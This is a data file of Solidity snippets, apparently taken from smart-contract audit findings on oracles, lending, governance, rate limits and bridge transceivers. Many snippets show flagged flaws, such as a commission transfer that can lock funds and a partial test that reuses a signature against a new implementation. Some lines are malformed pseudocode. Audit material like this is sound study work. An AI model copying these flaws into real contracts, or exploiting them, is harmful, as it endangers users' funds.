"```\nfunction oracleCircuitBreaker(\n    uint80 roundId,\n    uint80 baseRoundId,\n    int256 chainlinkPrice,\n    int256 baseChainlinkPrice,\n    uint256 timeStamp,\n    uint256 baseTimeStamp\n) private view {\n    bool invalidFetchData = roundId == 0 || timeStamp == 0\n        || timeStamp > block.timestamp || chainlinkPrice <= 0 || baseRoundId == 0\n        || baseTimeStamp == 0 || baseTimeStamp > block.timestamp\n        || baseChainlinkPrice <= 0;\n\n    if (invalidFetchData) revert Errors.InvalidPrice();\n}\n\nfunction baseOracleCircuitBreaker(\n    uint256 protocolPrice,\n    uint80 roundId,\n    int256 chainlinkPrice,\n    uint256 timeStamp,\n    uint256 chainlinkPriceInEth\n) private view returns (uint256 _protocolPrice) {\n    bool invalidFetchData = roundId == 0 || timeStamp == 0\n        || timeStamp > block.timestamp || chainlinkPrice <= 0\n        || block.timestamp > 2 hours + timeStamp;\n    uint256 chainlinkDiff = chainlinkPriceInEth > protocolPrice\n       ? chainlinkPriceInEth - protocolPrice\n        : protocolPrice - chainlinkPriceInEth;\n    bool priceDeviation =\n        protocolPrice > 0 && chainlinkDiff.div(protocolPrice) > 0.5 ether;\n\n    // rest of code\n}\n```"
"```\nfunction baseOracleCircuitBreaker(\n    uint256 protocolPrice,\n    uint80 roundId,\n    int256 chainlinkPrice,\n    uint256 timeStamp,\n    uint256 chainlinkPriceInEth\n) private view returns (uint256 _protocolPrice) {\n    bool invalidFetchData = roundId == 0 || timeStamp == 0\n        || timeStamp > block.timestamp || chainlinkPrice <= 0\n        || block.timestamp > 2 hours + timeStamp;\n\n    if (invalidFetchData || priceDeviation) {\n        uint256 twapPrice = IDiamond(payable(address(this))).estimateWETHInUSDC(\n            Constants.UNISWAP_WETH_BASE_AMT, 30 minutes\n        );\n        uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;\n        uint256 twapPriceInv = twapPriceInEther.inv();\n\n        if (twapPriceInEther == 0) {\n            revert Errors.InvalidTwapPrice();\n        }\n\n        if (invalidFetchData) {\n            return twapPriceInv;\n        }\n    } else {\n        return chainlinkPriceInEth;\n    }\n}\n```"
"```\nfunction decreaseCollateral(\n    address asset,\n    uint8 id,\n    uint256 amount\n) \n    external\n    isNotFrozen(asset)\n    nonReentrant\n    onlyValidShortRecord(asset, msg.sender, id)\n{\n    STypes.ShortRecord storage short = s.shortRecords[asset][msg.sender][id];\n    short.updateErcDebt(asset);\n    if (amount > short.collateral) {\n        revert Errors.InsufficientCollateral();\n    }\n    short.collateral -= amount;\n\n    uint256 cRatio = short.getCollateralRatio(asset);\n    if (cRatio < LibAsset.initialMargin(asset)) {\n        revert Errors.CollateralLowerThanMin();\n    }\n    uint256 vault = s.asset[asset].vault;\n    s.vaultUser[vault][msg.sender].ethEscrowed += amount;\n    LibShortRecord.disburseCollateral(\n        asset, msg.sender, amount, short.zethYieldRate, short.updatedAt\n    );\n    emit Events.DecreaseCollateral(asset, msg.sender, id, amount);\n}\n```\n```\nfunction getCollateralRatio(\n    STypes.ShortRecord memory short,\n    address asset\n) \n    internal\n    view\n    returns (uint256 cRatio)\n{\n    return short.collateral.div(short.ercDebt.mul(LibOracle.getPrice(asset)));\n}\n```\n```\nfunction getPrice(address asset) internal view returns (uint80 oraclePrice) {\n    AppStorage storage s = appStorage();\n    return uint80(s.bids[asset][Constants.HEAD].ercAmount);\n}\n```"
```\nfunction updateYield(uint256 vault) internal {\n    AppStorage storage s = appStorage();\n    STypes.Vault storage Vault = s.vault[vault];\n    STypes.VaultUser storage TAPP = s.vaultUser[vault][address(this)];\n\n    uint88 zethTotalNew = uint88(getZethTotal(vault));  // @dev(safe-cast)\n    uint88 zethTotal = Vault.zethTotal;\n    uint88 zethCollateral = Vault.zethCollateral;\n    uint88 zethTreasury = TAPP.ethEscrowed;\n\n    if (zethTotalNew <= zethTotal) return;\n\n    uint88 yield = zethTotalNew - zethTotal;\n    Vault.zethTotal = zethTotalNew;\n\n    if (zethCollateral == 0) {\n        TAPP.ethEscrowed += yield;\n        return;\n    }\n\n    uint88 zethTreasuryReward = yield.mul(zethTreasury).divU88(zethTotal);\n    yield -= zethTreasuryReward;\n\n    uint88 tithe = yield.mulU88(Vault.zethTithePercent());\n    yield -= tithe;\n\n    TAPP.ethEscrowed += zethTreasuryReward + tithe;\n    Vault.zethCollateralReward += yield;\n    Vault.zethYieldRate += yield.divU80(zethCollateral);\n}\n```
"```\nfunction baseOracleCircuitBreaker(\n    uint256 protocolPrice,\n    uint80 roundId,\n    int256 chainlinkPrice,\n    uint256 timeStamp,\n    uint256 chainlinkPriceInEth\n) private view returns (uint256 _protocolPrice) {\n    bool invalidFetchData = roundId == 0 || timeStamp == 0\n        || timeStamp > block.timestamp || chainlinkPrice <= 0\n        || block.timestamp > 2 hours + timeStamp;\n    uint256 chainlinkDiff = chainlinkPriceInEth > protocolPrice\n       ? chainlinkPriceInEth - protocolPrice\n        : protocolPrice - chainlinkPriceInEth;\n    bool priceDeviation = protocolPrice > 0 && chainlinkDiff.div(protocolPrice) > 0.5 ether;\n\n    if (invalidFetchData || priceDeviation) {\n        // rest of code\n    } else {\n        return chainlinkPriceInEth;\n    }\n}\n```"
"```\nfunction burnNFT(uint256 tokenId) internal {\n    AppStorage storage s = appStorage();\n    STypes.NFT storage nft = s.nftMapping[tokenId];\n    if (nft.owner == address(0)) revert Errors.NotMinted();\n    address asset = s.assetMapping[nft.assetId];\n    STypes.ShortRecord storage short = s.shortRecords[asset][nft.owner][nft.shortRecordId];\n    delete s.nftMapping[tokenId];\n    delete s.getApproved[tokenId];\n    delete short.tokenId;\n    emit Events.Transfer(nft.owner, address(0), tokenId);\n}\n```"
"```\nfunction setContest(address organizer, bytes32 contestId, uint256 closeTime, address implementation)\n    public\n    onlyOwner\n{\n    bytes32 salt = _calculateSalt(organizer, contestId, implementation);\n    if (saltToCloseTime[salt]!= 0) revert ProxyFactory__ContestIsAlreadyRegistered();\n    saltToCloseTime[salt] = closeTime;\n}\n```\n```\nfunction deployProxyAndDistributeBySignature(\n    address organizer,\n    bytes32 contestId,\n    address implementation,\n    bytes calldata signature,\n    bytes calldata data\n) public returns (address) {\n    bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(contestId, data)));\n    if (ECDSA.recover(digest, signature)!= organizer) {\n        revert ProxyFactory__InvalidSignature();\n    }\n    bytes32 salt = _calculateSalt(organizer, contestId, implementation);\n    if (saltToCloseTime[salt] == 0) {\n        revert ProxyFactory__ContestIsNotRegistered();\n    }\n    if (saltToCloseTime[salt] > block.timestamp) {\n        revert ProxyFactory__ContestIsNotClosed();\n    }\n    address proxy = _deployProxy(organizer, contestId, implementation);\n    _distribute(proxy, data);\n    return proxy;\n}\n```\n```\nfunction testSignatureCanBeUsedToNewImplementation() public {\n    address organizer = TEST_SIGNER;\n    bytes32 contestId = keccak256(abi.encode(""Jason"", ""001""));\n\n    vm.startPrank(factoryAdmin);\n    proxyFactory.setContest(organizer, contestId, block.timestamp + 8 days, address(distributor));\n    vm.stopPrank();\n\n    bytes32 salt = keccak256(abi.encode(organizer, contestId, address(distributor)));\n    address proxyAddress = proxyFactory.getProxyAddress(salt, address(distributor));\n    vm.startPrank(sponsor);\n    MockERC20(jpycv2Address).transfer(proxyAddress, 10000 ether);\n    vm.stopPrank();\n    assertEq(MockERC20(jpycv2Address).balanceOf(proxyAddress), 10000 ether);\n\n    assertEq(MockERC20(jpycv2Address).balanceOf(user1), 0 ether);\n    assertEq(MockERC20(jpycv2Address).balanceOf(stadiumAddress), 0 ether);\n\n    (bytes32 digest, bytes memory sendingData, bytes memory signature) = createSignatureByASigner(TEST_SIGNER_KEY);\n    assertEq(ECDSA.recover(digest, signature), TEST_SIGNER);\n    vm.warp(8.01 days);\n\n    proxyFactory.deployProxyAndDistributeBySignature(\n        TEST_SIGNER, contestId, address(distributor), signature, sendingData\n    );\n    assertEq(MockERC20(jpycv2Address).balanceOf(user1), 9500 ether);\n    assertEq(MockERC20(jpycv2Address).balanceOf(stadiumAddress), 500 ether);\n\n    // For some reason there is a new distributor implementation.\n    // The Owner set the new distributor for the same contestId\n    Distributor new_distributor = new Distributor(address(proxyFactory), stadiumAddress);\n    vm.startPrank(factoryAdmin);\n    proxyFactory.setContest(organizer, contestId, block.timestamp + 8 days, address(new_distributor));\n    vm.stopPrank();\n\n    bytes32 newDistributorSalt = keccak256(abi.encode(organizer, contestId, address(new_distributor)));\n    address proxyNewDistributorAddress = proxyFactory.getProxyAddress(newDistributorSalt, address(new_distributor));\n    vm.startPrank(sponsor);\n    MockERC20(jpycv2Address).transfer(proxyNewDistributorAddress, 10000 ether);\n    vm.stopPrank();\n\n    vm.warp(20 days"
"```\nfunction _distribute(address token, address[] memory winners, uint256[] memory percentages, bytes memory data)\n    internal {\n    _commissionTransfer(erc20); //= FOUND\n}\n\nfunction _commissionTransfer(IERC20 token) internal {\n    token.safeTransfer(STADIUM_ADDRESS, token.balanceOf(address(this))); //= FOUND: Blacklisted STADIUM_ADDRESS address cause fund stuck in the contract forever\n}\n```"
```\nif (amount > rateLimit.limit - rateLimit.currentAmount) {\n    revert RateLimitExceeded();\n}\n```
"```\nfunction initializeInvestorStateDefault(\n    address[] memory addresses\n) external onlyRole(CONFIGURER_ROLE) {\n    _initializeInvestorState(\n        addresses,\n        defaultMintLimit,\n        defaultRedemptionLimit,\n        defaultMintLimitDuration,\n        defaultRedemptionLimitDuration\n    );\n}\n\nfunction _initializeInvestorState(\n    address[] memory addresses,\n    uint256 mintLimit,\n    uint256 redemptionLimit,\n    uint256 mintLimitDuration,\n    uint256 redemptionLimitDuration\n) internal {\n    uint256 investorId = ++investorIdCounter;\n\n    for (uint256 i = 0; i < addresses.length; i++) {\n        if (addressToInvestorId[addresses[i]]!= 0) {\n            revert AddressAlreadyAssociated();\n        }\n        _setAddressToInvestorId(addresses[i], investorId);\n    }\n\n    investorIdToMintState[investorId] = RateLimit({\n        currentAmount: 0,\n        limit: mintLimit,\n        lastResetTime: block.timestamp,\n        limitDuration: mintLimitDuration\n    });\n    investorIdToRedemptionState[investorId] = RateLimit({\n        currentAmount: 0,\n        limit: redemptionLimit,\n        lastResetTime: block.timestamp,\n        limitDuration: redemptionLimitDuration\n    });\n}\n```"
"```\nrequire(\n  amount <= instantMintLimit - currentInstantMintAmount,\n  ""RateLimit: Mint exceeds rate limit""\n);"
"```\nuint256 usdcBalanceBefore = usdc.balanceOf(address(this));\n\nbuidl.approve(address(buidlRedeemer), buidlAmountToRedeem);\nbuidlRedeemer.redeem(buidlAmountToRedeem);\n\nrequire(\n    usdc.balanceOf(address(this)) == usdcBalanceBefore + buidlAmountToRedeem,\n    ""OUSGInstantManager::_redeemBUIDL: BUIDL:USDC not 1:1""\n);\n```"
```\nif (ousgSharesAmount < OUSG_TO_ROUSG_SHARES_MULTIPLIER):\n    revert UnwrapTooSmall()\n```
"```\nfunction lock(uint256 amount) external {\n    uint256 mintAmount = _GiBGTMintAmount(amount);\n    poolSize += amount;\n    _refreshiBGT(amount);\n    SafeTransferLib.safeTransferFrom(ibgt, msg.sender, address(this), amount);\n    _mint(msg.sender, mintAmount);\n    emit iBGTLock(msg.sender, amount);\n}\n\nfunction _refreshiBGT(uint256 ibgtAmount) internal {\n    ERC20(ibgt).approve(ibgtVault, ibgtAmount);\n    iBGTVault(ibgtVault).stake(ibgtAmount);\n}\n```"
"```\nfunction repay(uint256 repayAmount, uint256 _userLoanId) external {\n    Loan memory userLoan = loans[msg.sender][_userLoanId];\n    if (userLoan.borrowedAmount < repayAmount) {\n        revert ExcessiveRepay();\n    }\n    if (block.timestamp > userLoan.endDate) {\n        revert LoanExpired();\n    }\n    uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);\n    uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio);\n    outstandingDebt -= repayAmount - interest > outstandingDebt? outstandingDebt : repayAmount - interest;\n    loans[msg.sender][_userLoanId].borrowedAmount -= repayAmount;\n    loans[msg.sender][_userLoanId].interest -= interest;\n    poolSize += userLoan.interest * (1000 - (multisigShare + apdaoShare)) / 1000;\n}\n```"
"```\nfunction _buildBoost(\n    address[] calldata partnerNFTs,\n    uint256[] calldata partnerNFTIds\n) internal returns (Boost memory newUserBoost) {\n    uint256 magnitude;\n    Boost storage userBoost = boosts[msg.sender];\n    if (userBoost.expiry == 0) {\n        // rest of code\n    } else {\n        address[] storage nfts = userBoost.partnerNFTs;\n        uint256[] storage ids = userBoost.partnerNFTIds;\n        magnitude = userBoost.boostMagnitude;\n        for (uint256 i = 0; i < partnerNFTs.length; i++) {\n            magnitude += partnerNFTBoosts[partnerNFTs[i]];\n            nfts.push(partnerNFTs[i]);\n            ids.push(partnerNFTIds[i]);\n        }\n        newUserBoost = Boost({\n            partnerNFTs: nfts,\n            partnerNFTIds: ids,\n            expiry: block.timestamp + boostLockDuration,\n            boostMagnitude: magnitude\n        });\n    }\n}\n```"
"```\nfunction _vestingCheck(address user, uint256 amount) internal view returns (uint256) {\n    if (teamAllocations[user] > 0) return 0; // return 0 for team members\n\n    uint256 initialAllocation = seedAllocations[user];\n\n    if (initialAllocation > 0) {\n        if (block.timestamp < vestingStart) return 0;\n        uint256 vestPortion = FixedPointMathLib.divWad(block.timestamp - vestingStart, vestingEnd - vestingStart);\n        return FixedPointMathLib.mulWad(vestPortion, initialAllocation) - (initialAllocation - stakedLocks[user]);\n    } else {\n        return amount;\n    }\n}\n```"
"```\nfunction deposit(uint256 amount) external {\n    deposits[msg.sender] += amount;\n    _moveDelegates(address(0), delegates[msg.sender], amount);\n    SafeTransferLib.safeTransferFrom(locks, msg.sender, address(this), amount);\n    _mint(msg.sender, amount);\n}\n\n/// @notice Withdraws Locks to burn Govlocks\n/// @param amount Amount of Locks to withdraw\nfunction withdraw(uint256 amount) external {\n    deposits[msg.sender] -= amount;\n    _moveDelegates(delegates[msg.sender], address(0), amount);\n    _burn(msg.sender, amount);\n    SafeTransferLib.safeTransfer(locks, msg.sender, amount);\n}\n```"
"```\nfunction multisigInterestClaim() external {\n    if (msg.sender!= multisig) revert NotMultisig();\n    uint256 interestClaim = multisigClaims;\n    multisigClaims = 0;\n    SafeTransferLib.safeTransfer(ibgt, multisig, interestClaim);\n}\n\nfunction apdaoInterestClaim() external {\n    if (msg.sender!= apdao) revert NotAPDAO();\n    uint256 interestClaim = apdaoClaims;\n    apdaoClaims = 0;\n    SafeTransferLib.safeTransfer(ibgt, apdao, interestClaim);\n}\n\nfunction sunsetProtocol() external {\n    if (msg.sender!= timelock) revert NotTimelock();\n    SafeTransferLib.safeTransfer(ibgt, multisig, poolSize - outstandingDebt);\n}\n```"
```\nfunction _getProposalState(uint256 proposalId) internal view returns (ProposalState) {\n    Proposal storage proposal = proposals[proposalId];\n\n    if (proposal.cancelled) {\n        return ProposalState.Canceled;\n    } else if (block.number <= proposal.startBlock) {\n        return ProposalState.Pending;\n    } else if (block.number <= proposal.endBlock) {\n        return ProposalState.Active;\n    } else if (proposal.eta == 0) {\n        return ProposalState.Succeeded;\n    } else if (proposal.executed) {\n        return ProposalState.Executed;\n    } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < Goldiswap(goldiswap).totalSupply() / 20) {\n        return ProposalState.Defeated;\n    } else if (block.timestamp >= proposal.eta + Timelock(timelock).GRACE_PERIOD()) {\n        return ProposalState.Expired;\n    } else {\n        return ProposalState.Queued;\n    }\n}\n```
"```\nfunction redeemYield(uint256 amount) external {\n    if (amount == 0) {\n        revert InvalidRedemption();\n    }\n    if (block.timestamp < concludeTime + delay ||!concluded) {\n        revert NotConcluded();\n    }\n    uint256 yieldShare = FixedPointMathLib.divWad(amount, ERC20(yt).totalSupply());\n    YieldToken(yt).burnYT(msg.sender, amount);\n    uint256 yieldTokensLength = yieldTokens.length;\n    for (uint8 i = 0; i < yieldTokensLength; ++i) {\n        uint256 finalYield;\n        if (yieldTokens[i] == depositToken) {\n            finalYield = ERC20(yieldTokens[i]).balanceOf(address(this)) - depositTokenAmount;\n        } else {\n            finalYield = ERC20(yieldTokens[i]).balanceOf(address(this));\n        }\n        uint256 claimable = FixedPointMathLib.mulWad(finalYield, yieldShare);\n        SafeTransferLib.safeTransfer(yieldTokens[i], msg.sender, claimable);\n    }\n    emit YieldTokenRedemption(msg.sender, amount);\n}\n```"
"```\nfunction cancel(uint256 proposalId) external {\n    if (_getProposalState(proposalId) == ProposalState.Executed) revert InvalidProposalState();\n    Proposal storage proposal = proposals[proposalId];\n    if (msg.sender!= proposal.proposer) revert NotProposer();\n    if (GovLocks(govlocks).getPriorVotes(proposal.proposer, block.number - 1) > proposalThreshold) revert AboveThreshold();\n    proposal.cancelled = true;\n    uint256 targetsLength = proposal.targets.length;\n    for (uint256 i = 0; i < targetsLength; i++) {\n        Timelock(timelock).cancelTransaction(\n            proposal.targets[i],\n            proposal.eta,\n            proposal.values[i],\n            proposal.calldatas[i],\n            proposal.signatures[i]\n        );\n    }\n    emit ProposalCanceled(proposalId);\n}"
"```\nfunction setProposalThreshold(uint256 newProposalThreshold) external {\n    if (msg.sender!= multisig) {\n        revert NotMultisig();\n    }\n    if (newProposalThreshold < MIN_PROPOSAL_THRESHOLD || newProposalThreshold > MAX_PROPOSAL_THRESHOLD) {\n        revert InvalidVotingParameter();\n    }\n    uint256 oldProposalThreshold = proposalThreshold;\n    proposalThreshold = newProposalThreshold;\n    emit ProposalThresholdSet(oldProposalThreshold, proposalThreshold);\n}"
"```\nfunction repay(uint256 repayAmount, uint256 _userLoanId) external {\n    Loan memory userLoan = loans[msg.sender][_userLoanId];\n    if (userLoan.borrowedAmount < repayAmount) {\n        revert ExcessiveRepay();\n    }\n    if (block.timestamp > userLoan.endDate) {\n        revert LoanExpired();\n    }\n    uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);\n    uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio);\n    outstandingDebt -= repayAmount - interest > outstandingDebt? outstandingDebt : repayAmount - interest;\n    // rest of code\n}\n\nfunction liquidate(address user, uint256 _userLoanId) external {\n    Loan memory userLoan = loans[user][_userLoanId];\n    if (block.timestamp < userLoan.endDate || userLoan.liquidated || userLoan.borrowedAmount == 0) {\n        revert Unliquidatable();\n    }\n    loans[user][_userLoanId].liquidated = true;\n    loans[user][_userLoanId].borrowedAmount = 0;\n    outstandingDebt -= userLoan.borrowedAmount - userLoan.interest;\n    // rest of code\n}\n```"
```\n/// @notice Minimum voting period\nuint32 public constant MIN_VOTING_PERIOD = 5760; // About 24 hours\n\n/// @notice Maximum voting period\nuint32 public constant MAX_VOTING_PERIOD = 80640; // About 2 weeks\n\n/// @notice Minimum voting delay\nuint32 public constant MIN_VOTING_DELAY = 1;\n\n/// @notice Maximum voting delay\nuint32 public constant MAX_VOTING_DELAY = 40320; // About 1 week\n```\nBerachain has the following properties:\n\n    - Block time: 5s
"```\nfor (uint256 i = 0; i < instructionsLength; i++) {\n    TransceiverInstruction memory instruction;\n    (instruction, offset) = parseTransceiverInstructionUnchecked(encoded, offset);\n\n    uint8 instructionIndex = instruction.index;\n\n    if (i!= 0 && instructionIndex <= lastIndex) {\n        revert UnorderedInstructions();\n    }\n    lastIndex = instructionIndex;\n\n    instructions[instructionIndex] = instruction;\n}\n```"
"```\nbool isAmountRateLimited = _isOutboundAmountRateLimited(internalAmount);\n\nif (!shouldQueue && isAmountRateLimited) {\n    revert NotEnoughCapacity(getCurrentOutboundCapacity(), amount);\n}\n\nif (shouldQueue && isAmountRateLimited) {\n    emit OutboundTransferRateLimited(\n        msg.sender, sequence, amount, getCurrentOutboundCapacity()\n    );\n\n    _enqueueOutboundTransfer(\n        sequence,\n        trimmedAmount,\n        recipientChain,\n        recipient,\n        msg.sender,\n        transceiverInstructions\n    );\n\n    _refundToSender(msg.value);\n\n    return sequence;\n}\n```\n```\nfunction parseTransceiverInstructions(\n    bytes memory encoded,\n    uint256 numEnabledTransceivers\n) public pure returns (TransceiverInstruction[] memory) {\n    uint256 offset = 0;\n    uint256 instructionsLength;\n    (instructionsLength, offset) = encoded.asUint8Unchecked(offset);\n\n    TransceiverInstruction[] memory instructions = new TransceiverInstruction[](numEnabledTransceivers);\n\n    uint256 lastIndex = 0;\n    for (uint256 i = 0; i < instructionsLength; i++) {\n        TransceiverInstruction memory instruction;\n        (instruction, offset) = parseTransceiverInstructionUnchecked(encoded, offset);\n\n        uint8 instructionIndex = instruction.index;\n\n        if (i!= 0 && instructionIndex <= lastIndex) {\n            revert UnorderedInstructions();\n        }\n        lastIndex = instructionIndex;\n\n        instructions[instructionIndex] = instruction;\n    }\n\n    encoded.checkLength(offset);\n\n    return instructions;\n}"
"```\nif (amountScaled > uint64.max) {\n    revert AmountTooLarge(amountScaled);\n}\n```\n```\nfunction shift(\n    TrimmedAmount memory amount,\n    uint8 toDecimals\n) internal pure returns (TrimmedAmount memory) {\n    uint8 actualToDecimals = minUint8(TRIMMED_DECIMALS, toDecimals);\n    return TrimmedAmount(\n        uint64(\n            scale(\n                amount.amount,\n                amount.decimals,\n                actualToDecimals\n            ),\n            actualToDecimals\n        )\n    );\n}\n```"
```\nfunction _setTransceiver(address transceiver) internal returns (uint8 index) {\n    if (transceiver == address(0)) {\n        revert InvalidTransceiverZeroAddress();\n    }\n\n    if (_numTransceivers.registered >= MAX_TRANSCEIVERS) {\n        revert TooManyTransceivers();\n    }\n\n    if (transceiverInfos[transceiver].registered) {\n        transceiverInfos[transceiver].enabled = true;\n    }\n}
```\nfunction pause() public {\n    _pause();\n}\n```
"```\nfunction _initialize() internal virtual override {\n    if (msg.sender!= deployer) {\n        revert UnexpectedDeployer(deployer, msg.sender);\n    }\n\n    __ReentrancyGuard_init();\n    __PausedOwnable_init(msg.sender, getNttManagerOwner());\n}\n```\n```\nfunction transferTransceiverOwnership(address newOwner) external onlyNttManager {\n    _transferOwnership(newOwner);\n}\n```\n```\nfunction transferOwnership(address newOwner) public override onlyOwner {\n    super.transferOwnership(newOwner);\n\n    address[] storage _registeredTransceivers = _getRegisteredTransceiversStorage();\n    _checkRegisteredTransceiversInvariants();\n\n    for (uint256 i = 0; i < _registeredTransceivers.length; i++) {\n        ITransceiver(_registeredTransceivers[i]).transferTransceiverOwnership(newOwner);\n    }\n}\n```"
```\nfunction _pauseTransceiver() internal {\n    _pause();\n}\n```
"```\nbytes4 constant WH_TRANSCEIVER_PAYLOAD_PREFIX = 0x9945FF10;\n```\n```\ncast\n--from-utf8\n""EWH""\n```"
"```\nrequire(\n    msg.sender.toUniversalAddress() == deposit.mintRecipient,\n    ""caller must be mintRecipient""\n);"
"```\nfunction sliceUnchecked(bytes memory encoded, uint256 offset, uint256 length)\n    internal\n    pure\n    returns (bytes memory ret, uint256 nextOffset)\n{\n    if (length == 0) {\n        return (new bytes(0), offset);\n    }\n\n    assembly {\n        nextOffset := add(offset, length)\n        ret := mload(freeMemoryPtr)\n\n        let shift := and(length, 31)\n        if iszero(shift) {\n            shift := 32\n        }\n\n        let dest := add(ret, shift)\n        let end := add(dest, length)\n        for (\n            let src := add(add(encoded, shift), offset);\n            lt(dest, end);\n            src := add(src, 32),\n            dest := add(dest, 32)\n        ) {\n            mstore(dest, mload(src))\n        }\n\n        mstore(ret, length)\n        mstore(freeMemoryPtr, and(add(dest, 31), not(31)))\n    }\n}\n```\nfunction slice(bytes memory encoded, uint256 offset, uint256 length)\n    internal\n    pure\n    returns (bytes memory ret, uint256 nextOffset)\n{\n    (ret, nextOffset) = sliceUnchecked(encoded, offset, length);\n    checkBound(nextOffset, encoded.length);\n}\n```"
"```\nfunction registerEmitterAndDomain(bytes memory encodedVaa) public {\n    // For now, ensure that we cannot register the same foreign chain again.\n    require(registeredEmitters[foreignChain] == 0, ""chain already registered"");\n\n    // Set the registeredEmitters state variable.\n    registeredEmitters[foreignChain] = foreignAddress;\n\n    // update the chainId to domain (and domain to chainId) mappings\n    getChainToDomain()[foreignChain] = cctpDomain;\n    getDomainToChain()[cctpDomain] = foreignChain;\n}\n```"
```\nfunction registerEmitterAndDomain(bytes memory encodedVaa) public {\n    /* parsing of Governance VAA payload */\n\n    registeredEmitters[foreignChain] = foreignAddress;\n\n    getChainToDomain()[foreignChain] = cctpDomain;\n    getDomainToChain()[cctpDomain] = foreignChain;\n}\n```
"```\nfunction submitNewGuardianSet(bytes memory _vm) public {\n    // Trigger a time-based expiry of current guardianSet\n    expireGuardianSet(getCurrentGuardianSetIndex());\n\n    // Add the new guardianSet to guardianSets\n    storeGuardianSet(upgrade.newGuardianSet, upgrade.newGuardianSetIndex);\n\n    // Makes the new guardianSet effective\n    updateGuardianSetIndex(upgrade.newGuardianSetIndex);\n}\n```\n```\nfunction expireGuardianSet(uint32 index) internal {\n    _state.guardianSets[index].expirationTime = uint32(block.timestamp) + 86400;\n}\n```\n```\nif (vm.guardianSetIndex!= getCurrentGuardianSetIndex() && guardianSet.expirationTime < block.timestamp):\n    return (false, ""guardian set has expired"")\n```\n```\nrequire(\n    msg.sender.toUniversalAddress() == deposit.mintRecipient,\n    ""caller must be mintRecipient""\n);"
"```\nfunction _giveAllowances() private {\n    IERC20Metadata(lpToken0).forceApprove(unirouter, type(uint256).max);\n    IERC20Metadata(lpToken1).forceApprove(unirouter, type(uint256).max);\n}\n```\n```\nfunction setUnirouter(address _unirouter) external onlyOwner {\n    unirouter = _unirouter;\n    emit SetUnirouter(_unirouter);\n}\n```"
```\nshares = _amount1 + (_amount0 * price / PRECISION)\n```
```\nfunction _onlyCalmPeriods() private view {\n    int24 tick = currentTick();\n    int56 twapTick = twap();\n\n    if (\n        twapTick - maxTickDeviationNegative > tick ||\n        twapTick + maxTickDeviationPositive < tick\n    ) {\n        revert NotCalm();\n    }\n}\n```
```\nuint256 _amount0 = (_bal0 * _shares) / _totalSupply;\nuint256 _amount1 = (_bal1 * _shares) / _totalSupply;\n```
"```\nuint256 rateWhenCreated = AccessControlManager.swETH().swETHToETHRate();\n```\n```\nfunction processWithdrawals(\n    uint256 _lastTokenIdToProcess,\n    uint256 _processedRate\n) external override\ncheckRole(SwellLib.BOT) {\n```\n```\nuint256 finalRate = _processedRate > rateWhenCreated\n   ? rateWhenCreated\n    : _processedRate;\n```\n```\nuint256 requestExitedETH = wrap(amount).mul(wrap(finalRate)).unwrap();\n```"
"```\n(, int256 externallyReportedV3Balance,,, ) = \n    AggregatorV3Interface(\n        ExternalV3ReservesPoROracle\n    ).latestRoundData();\n```"
```\nuint256 swETHAmount = wrap(msg.value).mul(_ethToSwETHRate()).unwrap();\n```
"```\nfunction triggerRoot() external {\n    bytes32 rootCandidateAValue = rootCandidateA.value;\n    if (rootCandidateAValue!= rootCandidateB.value || rootCandidateAValue == bytes32(0)) {\n        revert RootCandidatesInvalid();\n    }\n    root = Root({value: rootCandidateAValue, lastUpdatedAt: block.timestamp});\n    emit RootChanged(msg.sender, rootCandidateAValue);\n}\n```"
"```\nfunction _depositLPIncentive(\n    StoredReward memory reward,\n    uint256 amount,\n    uint256 periodReceived\n) private {\n    IERC20(reward.token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n\n    _storeReward(periodReceived, reward, amount);\n}\n```"
"```\n(bool sent,) = _to.call(value: _amount, """");\nrequire(sent);\n```\n```\n(bool sent, bytes memory data) = _to.call{value: _amount}("""");\nrequire(sent);\n```"
```\nfinalUserAmount = finalToken.balanceOf(address(this)) - relayerFeeAmount\n```
"```\n(bool sentToUser, ) = recipient.call{ value: finalUserAmount }("""");\nrequire(sentToUser, ""Failed to send Ether"");\n```\n```\n(bool sentToUser, bytes memory data) = recipient.call{ value: finalUserAmount }("""");\nrequire(sentToUser, ""Failed to send Ether"");\n```"
```\n_stemTipForToken = s.ss[token].milestoneStem + \n    int96(s.ss[token].stalkEarnedPerSeason).mul(\n        int96(s.season.current).sub(int96(s.ss[token].milestoneSeason))\n    )\n```
"```\nfunction getWellPriceFromTwaReserves(address well) internal view returns (uint256 price) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n\n    if (s.twaReserves[well].reserve0 == 0) {\n        price = 0;\n    } else {\n        price = s.twaReserves[well].reserve0.mul(1e18).div(s.twaReserves[well].reserve1);\n    }\n}\n```\nfunction setTwaReservesForWell(address well, uint256[] memory twaReserves) internal {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n\n    if (twaReserves.length < 1) {\n        delete s.twaReserves[well].reserve0;\n        delete s.twaReserves[well].reserve1;\n    } else {\n        s.twaReserves[well].reserve0 = uint128(twaReserves[0]);\n        s.twaReserves[well].reserve1 = uint128(twaReserves[1]);\n    }\n}"
```\nuint256 removedBDV = amount.mul(crateBDV).div(crateAmount);\n```
```\nif (vrfRequests[_requestId].fulfilled) {\n    revert InvalidVrfState();\n}\n```
"```\n(bool sent,) = address(operatorAddress).call{value: msg.value}("""");\nif (!sent) {\n    revert Unauthorized();\n}\n```\n```\n(bool sent, bytes memory data) = address(operatorAddress).call{value: msg.value}("""");\nif (!sent) {\n    revert Unauthorized();\n}\n```"
"```\nfunction _sendFunds(address token, address to, uint256 amount) internal {\n    if (token == ETHEREUM_ADDRESS) {\n        (bool success, ) = to.call{value: amount}("""");\n        require(success, ""TSP: failed to transfer ether"");\n    } else {\n        IERC20(token).safeTransferFrom(msg.sender, to, amount);\n    }\n}"
